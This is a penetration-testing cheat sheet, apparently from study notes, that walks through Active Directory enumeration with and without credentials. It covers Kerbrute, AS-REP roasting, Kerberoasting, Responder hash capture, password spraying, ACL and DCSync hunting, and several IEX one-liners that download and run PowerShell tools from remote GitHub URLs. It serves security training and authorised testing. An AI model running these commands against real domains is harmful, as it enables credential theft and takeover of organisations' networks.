# Active Directory Enumeration

### What brings you here
You found ports 88 (Kerberos), 389/636 (LDAP), or 3268/3269 (Global Catalog) — you are looking at a domain environment. Start here regardless of whether you have credentials.

---

## State 1: No Credentials

You are unauthenticated. Goal: find a valid username and/or hash to get a foothold.

### Checklist — No Creds

```bash
# 1. Identify the domain name
nmap -p 88,389 --script ldap-rootdse,krb5-enum-users <IP>
# Look for: defaultNamingContext, ldapServiceName

# 2. DNS enumeration — get more hostnames
dig any <domain> @<IP>
dig axfr <domain> @<IP>

# 3. LDAP anonymous bind — sometimes works
ldapsearch -x -H ldap://<IP> -b "dc=<domain>,dc=<tld>"
ldapsearch -x -H ldap://<IP> -b "dc=<domain>,dc=<tld>" "(objectClass=user)" sAMAccountName

# 4. Kerbrute — enumerate valid usernames (no lockout risk)
kerbrute userenum --dc <IP> -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum --dc <IP> -d <domain> jsmith.txt

# 5. AS-REP Roasting — accounts with pre-auth disabled (no creds needed)
impacket-GetNPUsers <domain>/ -dc-ip <IP> -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# 6. SMB null session — may return usernames
crackmapexec smb <IP> -u '' -p ''
enum4linux -a <IP>

# 7. LLMNR/NBT-NS Poisoning — capture NTLMv2 hashes
sudo responder -I <interface> -rdw
# Crack with hashcat -m 5600
```

### Decision Table — No Creds

| Finding | Next action |
|---------|-------------|
| Valid usernames from kerbrute | Try password spray: `username:username`, `username:Season+Year` |
| AS-REP hash returned | Crack with hashcat -m 18200 → [../cheatsheets/credential_cracking.md](../cheatsheets/credential_cracking.md) |
| NTLMv2 hash from Responder | Crack with hashcat -m 5600 |
| LDAP anonymous bind works | Full LDAP dump for users/groups |
| SMB null session returns users | Feed into AS-REP roasting |
| Credentials cracked | → **State 2 below** |

---

## State 2: With Credentials

You have valid domain credentials (user:pass, or NTLM hash). Goal: map the domain and find a path to Domain Admin.

### Checklist — With Creds

```bash
# 1. Validate credentials
crackmapexec smb <IP> -u <user> -p '<password>'
crackmapexec smb <IP> -u <user> -H <NTLM_HASH>

# 2. Run BloodHound — always do this first
# From Linux:
bloodhound-python -d <domain> -u <user> -p '<password>' -c All -ns <DC_IP>

# From Windows (if you have a shell):
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1)
Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup"

# 3. PowerView enumeration (from a Windows shell)
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)

# Get domain info
Get-NetDomain
Get-NetDomainController

# List all users — look for descriptions with passwords
Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}

# Kerberoastable accounts
Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname

# AS-REP Roastable accounts
Get-DomainUser -PreauthNotRequired | select Name

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# 4. Kerberoasting — with valid creds
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP> -request -outputfile kerberoast_hashes.txt
# Crack with hashcat -m 13100

# 5. Find local admin access
Find-LocalAdminAccess -Verbose

# 6. User hunting — where are admins logged in?
Invoke-UserHunter -CheckAccess
```

### Decision Table — With Creds

| Finding | Next action | Link |
|---------|-------------|------|
| BloodHound shows path to DA | Follow shortest path in BloodHound | [active_directory_exploitation.md](active_directory_exploitation.md) |
| Kerberoastable accounts | Request TGS, crack offline | [../cheatsheets/credential_cracking.md](../cheatsheets/credential_cracking.md) |
| AS-REP Roastable accounts | Request AS-REP, crack offline | [../cheatsheets/credential_cracking.md](../cheatsheets/credential_cracking.md) |
| Password in user description | Immediate credential → test | [../CRED_TRACKER.md](../CRED_TRACKER.md) |
| GenericAll / GenericWrite / WriteDACL on object | ACL abuse | [active_directory_exploitation.md](active_directory_exploitation.md) |
| Current user is local admin on a machine | Run WinPEAS, dump creds | [../post_exploitation/index.md](../post_exploitation/index.md) |
| DA session on a machine you can access | Wait/hunt for DA → Invoke-UserHunter | [active_directory_exploitation.md](active_directory_exploitation.md) |
| LAPS readable | Get local admin password | [active_directory_exploitation.md](active_directory_exploitation.md) |
| GPO with write access | Modify GPO to push admin | [active_directory_exploitation.md](active_directory_exploitation.md) |

---

## The Concept

The idea with any AD target: understand **Who** has access, **What** services it runs, **When** they run, and **Where** it is on the network.

Start by finding the Domain Controllers, enumerate running services and check for anonymous access misconfigurations. LDAP queries reveal a large amount of information even without authentication in some configurations.

---

## Enumeration Tools

**adPEAS:** https://github.com/61106960/adPEAS
**BloodHound:** https://github.com/BloodHoundAD/BloodHound
**Invoke-ADEnum:** https://github.com/Leo4j/Invoke-ADEnum
**Powerview:** https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
**Pywerview:** https://github.com/the-useless-one/pywerview

```bash
# adPEAS
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1);Invoke-adPEAS

# BloodHound
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup"
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup" -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00

# Invoke-ADEnum
IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1);Invoke-ADEnum

# PowerUpSQL
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")

# PowerView
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
```

## Native AD Module

```powershell
iex (new-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1");Import-ActiveDirectory
```

## General Enumeration

### Domain Computer Enumeration

```bash
# List all computers in current Domain
Get-DomainComputer
Get-DomainComputer | Select Name,Description | Sort Name

# Ping all alive computers in current Domain
Get-DomainComputer -Ping

# List all computers with select Operating System
Get-DomainComputer -OperatingSystem "Windows 10 Pro"
Get-DomainComputer -OperatingSystem "Windows 7*"
Get-DomainComputer -OperatingSystem "Windows 8*"
Get-DomainComputer -OperatingSystem "Windows xp*"

# Get Computer objects that have Unconstrained Delegation
Get-DomainComputer -Unconstrained
```

### Domain Enumeration

```bash
# Domain Information
Get-NetDomain

# Domain Policy Information
Get-DomainPolicy
(Get-DomainPolicy)."SystemAccess"
(Get-DomainPolicy–domain <Domain>)."systemaccess"
(Get-DomainPolicy)."KerberosPolicy"

# Get Domain SID
Get-DomainSID
```

### Domain Controller Enumeration

```bash
# Get all Domain Controllers
Get-NetDomainController

# Get Primary Domain Controller
Get-NetDomain | Select-Object 'PdcRoleOwner'

# Get Domain Controller in different Domain
Get-NetDomainController -Domain <Domain>
```

### Domain Trust Enumeration

```bash
# Enumerate all Domains in the forest
Get-NetForestDomain

# Get all Domains in Forest then list each Domain trust
Get-NetForestDomain -Verbose | Get-DomainTrust

# Map all reachable Domain trusts
Get-DomainTrustMapping
Get-DomainTrustMapping | Select SourceName,TargetName,TrustType,TrustDirection

# List external trusts
Get-NetForestDomain -Verbose | Get-DomainTrust |?{$_.TrustType -eq 'External'}

# Enumerate trusts across the domain
Get-DomainTrust

# Find users in the current Domain that reside in Groups across trusts
Find-ForeignUser
```

### Group Enumeration

```bash
# List all Groups in current Domain
Get-NetGroup
Get-NetGroup -Properties SamAccountName | Sort SamAccountName

# Search for Groups with partial wildcard
Get-NetGroup "*admin*"
Get-NetGroup "*admin*"-Properties SamAccountName | Sort SamAccountName

# Identify interesting groups on a Domain Controller
Get-NetDomainController | Get-NetLocalGroup

# Get All groups and members of groups
Get-NetGroup | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName
```

### User Enumeration

```bash
# List all user accounts in Domain
Get-DomainUser

# List enabled user accounts
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name

# Get kerberoastable users
Get-DomainUser -SPN | select Name,SrvicepPincipalnNme

# Get AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select Name

# Search for string in User Description field
Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}

# Search for string in userPassword field
Get-DomainUser -Properties userPassword | Where {$_.userPassword -ne $null}
```

### Access Control Lists

```bash
# Find interesting ACLs for current user
Find-InterestingDomainAcl -ResolveGUIDs  | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}

# Get ACLs for specific AD Object
Get-DomainObjectAcl -SamAccountName <SAM> -ResolveGUIDs

# Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Users"}
```

### Kerberoastable Users

```bash
Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName
```

### AS-REP Roastable Users

```bash
Get-DomainUser -PreauthNotRequired | select UserPrincipalName
```

### DCSync Rights

```bash
# Ensure the Base path below is set to the root of the domain
$d = Get-ObjectACL "DC=Domain,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value ; Convert-SidToName $d
```

### Bloodhound

```bash
# Standard local execution
./SharpHound.exe --CollectionMethods All,GPOLocalGroup
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup

# Run in context of different user
runas.exe /netonly /user:domain\user 'powershell.exe -nop -exec bypass'
```

## Additional Notes

If Constrained Language mode is enabled on the target Domain Controller, Powerview will be heavily restricted for Domain enumeration. However, the AD PowerShell module will not be limited and allow Domain enumeration to continue.

---

## → Where to go next
- Have BloodHound data → [active_directory_exploitation.md](active_directory_exploitation.md)
- Cracked a hash → [../CRED_TRACKER.md](../CRED_TRACKER.md) → return to State 2
- Got shell on domain machine → [../post_exploitation/index.md](../post_exploitation/index.md)
- Nothing worked → [../STUCK.md](../STUCK.md)
